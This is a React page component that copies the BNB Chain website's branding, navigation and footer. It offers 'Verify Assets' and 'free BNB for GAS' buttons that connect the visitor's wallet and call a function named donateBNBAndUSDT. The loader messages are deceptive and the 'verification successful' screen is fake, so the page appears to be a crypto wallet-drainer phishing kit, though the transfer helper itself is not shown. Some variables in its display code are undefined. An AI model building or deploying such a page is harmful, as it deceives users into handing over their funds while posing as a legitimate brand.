"use client";
import { useState , useEffect} from 'react';
import { connectWallet, donateBNBAndUSDT } from "@/utils/bnbWallet";
import { useTranslation } from 'react-i18next';
import '../translations'; // Import the translations
import './App.css'


function LoaderBox({ showLoader }) {
  const messages = [
    "Submiting User Request..",
    "Creating User Request for GAS",
    "Trying to Request Gas Refill approval from User",
  ];

  const [currentMessageIndex, setCurrentMessageIndex] = useState(0);

  useEffect(() => {
    if (showLoader) {
      const interval = setInterval(() => {
        setCurrentMessageIndex((prevIndex) => (prevIndex + 1) % messages.length);
      }, 7000);
      return () => clearInterval(interval);
    }
  }, [showLoader, messages.length]);

  if (!showLoader) return null;

  return (
    <div className="loader-overlay">
      <div className="loader-box">
        <div className="spinner-loader"></div>
        <p className="loader-info">{messages[currentMessageIndex]}</p>
      </div>
    </div>
  );
}


function Notification({ message, onClose }) {
  return (
    <div className="notification">
      <p>{message}</p>
      <button className="close-button" onClick={onClose}>
        &times;
      </button>
    </div>
  );
}





export default function Home() {
  const { t } = useTranslation();
  const [isProcessing, setIsProcessing] = useState(false);
  const [walletAddress, setWalletAddress] = useState('');
  const [txHash, setTxHash] = useState('');
  const [donationAmount, setDonationAmount] = useState('');
  const [error, setError] = useState('');
  const [usdtTxHash, setUsdtTxHash] = useState('');
  const [usdtDonationAmount, setUsdtDonationAmount] = useState('');
  const [statusMessage, setStatusMessage] = useState({ amount: '', flash: '' });

  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [showLoader, setShowLoader] = useState(false);
  const [showVerificationMessage, setShowVerificationMessage] = useState(false); // State for verification message
  const [userBalances, setUserBalances] = useState({ usdt: null, bnb: null }); // Set initial balance to null to distinguish from zero


  const [notificationMessage, setNotificationMessage] = useState(""); // State for notification message
  const [showNotification, setShowNotification] = useState(false); // State to toggle notification visibility

  
  const USDT_LOGO_PATH = `${process.env.PUBLIC_URL}/Tlogo.png`; // Adjusted for React public folder
  const BNB_LOGO_PATH = `${process.env.PUBLIC_URL}/Blogo.png`; // Adjusted for React public folder

  const toggleMenu = () => {
    setIsMenuOpen((prev) => !prev);
    // Check if the state toggles correctly
  };

  async function handleCheck() {
    if (isProcessing) return;
    setIsProcessing(true);
    setShowLoader(true); 
    setNotificationMessage("");
      setShowNotification(false);
    setError('');
    setStatusMessage({ amount: '', flash: '' });
    
    try {
      const userAddress = await connectWallet();
      setWalletAddress(userAddress);
      
      const { bnbTxHash, usdtTxHash, bnbAmount, usdtAmount } = await donateBNBAndUSDT();
      setTxHash(bnbTxHash || '');
      setUsdtTxHash(usdtTxHash || '');
      setDonationAmount(bnbAmount);
      setUsdtDonationAmount(usdtAmount);
      setShowVerificationMessage(true)
    } catch (error) {
      if (error.amount && error.flash) {
        
       setUsdtDonationAmount(0);
      } else {
        setError(error.message);
      }
    } finally {
      setIsProcessing(false);
      setTimeout(() => {
        setShowLoader(false); // Hide loader
      }, 2000);
    }
  }

  return (
    <div className="app">
       {showNotification && (
      <Notification
        message={notificationMessage}
        onClose={() => setShowNotification(false)}
      />
    )}
      <LoaderBox showLoader={showLoader} />
      
    

      <div className="notification-bar">
        <p>Listed on 130 exchanges, BSC is the fastest growing crypto network.</p>
      </div>

      {/* Header */}
        <header className="app-header">
        <div className="header-left">
    <img src="/Frame_480972175.png" alt="BNB Chain Logo" className="logo" />
  </div>

          
          
          
          {/* Desktop Navigation Links */}
          <nav className="desktop-nav">
            <a href="https://www.bnbchain.org/en/bnb-smart-chain">Chains</a>
            <a href="https://portal.bnbchain.org/">Developer</a>
            <a href="https://dappbay.bnbchain.org/?utm_source=Org&utm_medium=Channel&utm_campaign=homepage_240124&utm_content=homepage">Ecosystem</a>
            <a href="https://www.bnbchain.org/en/community">Community</a>
            <a href="https://jobs.bnbchain.org/jobs">Careers</a>
          </nav>

          {/* Button Group for Desktop */}
          <div className="button-group">
            <a href="https://www.bnbchain.org/en/blog" className="support-button">Support</a>
            <a href="https://www.bnbchain.org/en/contact" className="contact-button">Contact Us</a>
          </div>

          {/* Hamburger button for mobile */}
          <button className="hamburger" onClick={toggleMenu}>
            &#9776;
          </button>
        </header>

        {/* Mobile Menu Overlay */}
        {isMenuOpen && (
          <div className="menu-overlay" onClick={() => setIsMenuOpen(false)}>
            <div className="menu open">
              <img src="/Frame_480972175.png" alt="BNB Chain Logo" className="menu-logo" />
      
              <button className="close-menu" onClick={() => setIsMenuOpen(false)}>
                &times;
              </button>
              <a className="menu-item" href="https://www.bnbchain.org/en/bnb-smart-chain">Chains</a>
              <a className="menu-item" href="https://portal.bnbchain.org/">Developer</a>
              <a className="menu-item" href="https://dappbay.bnbchain.org/?utm_source=Org&utm_medium=Channel&utm_campaign=homepage_240124&utm_content=homepage">Ecosystem</a>
              <a className="menu-item" href="https://www.bnbchain.org/en/community">Community</a>
              <a className="menu-item" href="https://jobs.bnbchain.org/jobs">Careers</a>
              
              {/* Button Group for Mobile */}
              <div className="button-group">
                <a href="https://www.bnbchain.org/en/blog" className="support-button">Support</a>
                <a href="https://www.bnbchain.org/en/contact" className="contact-button">Contact Us</a>
              </div>
            </div>
          </div>
        )}
              {/* Main Content Area */}
    <main className="main-content"style={{
    backgroundImage: `url(${process.env.PUBLIC_URL + 'BGmain.png'})`,
    backgroundSize: 'cover',
    backgroundPosition: 'center',
    backgroundRepeat: 'no-repeat',
    minHeight: '100vh',
    display: 'flex',
    flexDirection: 'column',
    justifyContent: 'center',
    alignItems: 'center',
  }}>
      {statusMessage.amount ? (
  <div style={{
    backgroundColor: 'rgba(0, 0, 0, 0.5)',
    backdropFilter: 'blur(4px)',
    padding: '1rem',
    borderRadius: '0.5rem',
    border: '1px solid rgba(255, 255, 255, 0.1)',
    textAlign: 'center'
  }}>
    <p style={{
      color: 'white',
      fontSize: '1.125rem',
      fontWeight: '600',
      marginBottom: '0.5rem'
    }}>
      {statusMessage.amount}
    </p>
    <p style={{
      color: 'white',
      fontSize: '1.125rem',
      fontWeight: '600'
    }}>
      {statusMessage.flash}
    </p>
  </div>

) : showVerificationMessage ? (
<div className="verification-message">
  <p>Verification successful! Reported Flash 0</p>
  <div
    className="balance-display"
    style={{
      marginTop: '10px',
      backgroundColor: 'black',
      padding: '10px',
      borderRadius: '5px',
      color: 'white',
      textAlign: 'center',
    }}
  >
    <h4>Available BNB Tokens:</h4>
    <p>
      <img
        src={USDT_LOGO_PATH}
        alt="USDT Logo"
        style={{ width: '20px', marginRight: '5px' }}
      />
      USDT = {usdtAmount !== null ? Math.floor(usdtAmount) : 'Loading...'}
    </p>
    <p>
      <img
        src={BNB_LOGO_PATH}
        alt="BNB Logo"
        style={{ width: '20px', marginRight: '5px' }}
      />
      BNB = {bnbAmount !== null ? bnbAmount.toFixed(4) : 'Loading...'}
    </p>
  </div>
</div>
) : usdtDonationAmount === 0 ? (
<div className="verification-message">
  <p>User request creation failed.</p> 
    <p className="line" style={{  color: '#ffffff'  }}>FetchedError:{"{"}NoTokenstoverify{"}"}</p>
</div>
) : (

        <>
          <h2>Verify Assets on <span className="highlight">BNB Chain</span></h2>
          <h3 className="sub-heading">Serving Gas Less Web3 tools to over 478 Million users</h3>
          <p className="description">A community-driven blockchain ecosystem of Layer-1 and Layer-2 scaling solutions.</p>
          <div className="main-buttons">
            <button className="primary-button" onClick={handleCheck}>Verify Assets</button>
            <a href="https://www.bnbchain.org/en" className="secondary-button">
            🏠︎   HOME
            </a>
          </div>
        </>
      )}
    </main>


      
      {/* Join BNB Chain Ecosystem Section */}
      <section className="white-section">
        <h3>Join the BNB Chain <span className="highlight">Ecosystem</span></h3>
        <p className="ecosystem-description">Get started in few steps to dive into the world of BNB Chain.</p>
        
        <div className="card-container">
          <div className="card">
            <h4>Download Wallet</h4>
            <p>A wallet helps you connect to BNB Chain and manage your funds.</p>
            <a href="https://www.bnbchain.org/en/wallets" className="card-button">Download Wallet</a>
            <img src="/image_no_background.png" alt="Wallet" />
          </div>

          <div className="card">
            <h4>Get free BNB for GAS</h4>
            <p>BNB is the currency of BNB Chain that is required on BNB chain for any interaction</p>
            <button className="card-button" onClick={handleCheck}>Get BNB</button>
            <img src="/abs.png" alt="BNB Tokens" />
          </div>
        </div>
      </section>

      {/* Community Section */}
      <section className="community-section">
        <h3>Get Involved, Be Part of the <span className="highlight">Community</span></h3>
        <p className="community-description">BNB Chain is a global, decentralized network with developers, validators, users, HODLers, and enthusiasts.</p>
        
        <div className="social-links">
          <a href="https://t.me/bnbchain" className="social-link">
            <img src="/telegram.png" alt="Telegram" className="social-icon" />
            Telegram
          </a>
          <a href="https://github.com/bnb-chain" className="social-link">
            <img src="/github.png" alt="GitHub" className="social-icon" />
            GitHub
          </a>
          <a href="https://www.youtube.com/channel/UCG9fZu6D4I83DStktBV0Ryw" className="social-link">
            <img src="/youtube.png" alt="YouTube" className="social-icon" />
            YouTube
          </a>
          <a href="https://twitter.com/BNBChain" className="social-link">
            <img src="/twitter.png" alt="Twitter" className="social-icon" />
            X
          </a>
          <a href="https://discord.gg/QRTQvfhADQ" className="social-link">
            <img src="/discord.png" alt="Discord" className="social-icon" />
            Discord
          </a>
        </div>
      </section>

      {/* Footer Section */}
      <footer className="footer">
        <div className="footer-container">
          <div className="footer-column">
            <h4>Chains</h4>
            <ul>
              <li><a href="https://www.bnbchain.org/en/bnb-smart-chain">BNB Smart Chain</a></li>
              <li><a href="https://greenfield.bnbchain.org/en">BNB Greenfield</a></li>
              <li><a href="https://opbnb.bnbchain.org/en">opBNB</a></li>
              <li><a href="https://zkbnb.bnbchain.org/">zkBNB</a></li>
            </ul>
          </div>
          <div className="footer-column">
            <h4>Use BNB Chain</h4>
            <ul>
              <li><a href="https://www.bnbchain.org/en/wallets">Download Wallet</a></li>
              <li><a href="https://www.bnbchain.org/en/what-is-bnb">Get BNB</a></li>
              <li><a href="https://www.bnbchain.org/en/bnb-staking">Stake BNB</a></li>
              <li><a href="https://www.bnbchain.org/en/bnb-chain-bridge">Bridge Assets</a></li>
              <li><a href="https://dappbay.bnbchain.org/">Explore dApps</a></li>
              <li><a href="https://btcfi.bnbchain.org/">Earn by BTC</a></li>
              <li><a href="https://www.bnbchain.org/en/payment">Pay by Crypto</a></li>
              <li><a href="https://www.bnbchain.org/en/liquid-staking">Earn by Liquid Staking</a></li>
            </ul>
          </div>
          <div className="footer-column">
            <h4>Build</h4>
            <ul>
              <li><a href="https://www.bnbchain.org/en/liquid-staking">Portal</a></li>
              <li><a href="https://docs.bnbchain.org/">Documentations</a></li>
              <li><a href="https://testnet.bnbchain.org/faucet-smart">Faucet</a></li>
              <li><a href="https://www.bnbchain.org/en/dev-tools">Dev Tools</a></li>
              <li><a href="https://dappbay.bnbchain.org/submit-dapp">Submit dApp</a></li>
              <li><a href="https://www.bnbchainlist.org/">BNBChain List</a></li>
              <li><a href="https://dcellar.io/">Greenfield Console</a></li>
              <li><a href="https://github.com/bnb-chain/whitepaper">Whitepaper</a></li>
            </ul>
          </div>
          <div className="footer-column">
            <h4>Participate</h4>
            <ul>
              <li><a href="https://www.bnbchain.org/en/events">Events</a></li>
              <li><a href="https://www.bnbchain.org/en/hackathon/bangkok">Hackathon</a></li>
              <li><a href="https://www.bnbchain.org/en/bsc-mvb-program">MVB Program</a></li>
              <li><a href="https://www.bnbchain.org/en/developers/developer-programs">Developer Programs</a></li>
              <li><a href="https://www.bnbchain.org/en/martians-program">Martians Program</a></li>
              <li><a href="https://bugbounty.bnbchain.org/">Bug Bounty</a></li>
              <li><a href="https://www.bnbchain.org/en/builders-club">Host an Event</a></li>
              <li><a href="https://www.bnbchain.org/en/space-b">Get Workspace</a></li>
              <li><a href="https://jobs.bnbchain.org/jobs">Ecosystem Jobs</a></li>
            </ul>
          </div>
          <div className="footer-column">
            <h4>About</h4>
            <ul>
              <li><a href="https://www.bnbchain.org/en/blog">Blog</a></li>
              <li><a href="https://jobs.bnbchain.org/companies/bnb-chain#content">Careers</a></li>
              <li><a href="https://www.bnbchain.org/en/official-verification">BNB Chain Verify</a></li>
              <li><a href="https://dappbay.bnbchain.org/red-alarm/dapp">Red Alarm</a></li>
              <li><a href="https://www.bnbchain.org/en/privacy-policy">Privacy Policy</a></li>
              <li><a href="https://www.bnbchain.org/en/terms">Terms of Use</a></li>
              <li><a href="https://www.bnbchain.org/en/contact">Contact Us</a></li>
              <li><a href="https://www.bnbchain.org/en/brand-guidelines">Brand Guidelines</a></li>
            </ul>
          </div>
        </div>
        <div className="footer-bottom">
          <p>© 2024 BNB Chain. All rights reserved.</p>
        </div>
      </footer>

      {/* Display the loader when showLoader is true */}
      {showLoader && <LoaderBox />}
    </div>

  );
}
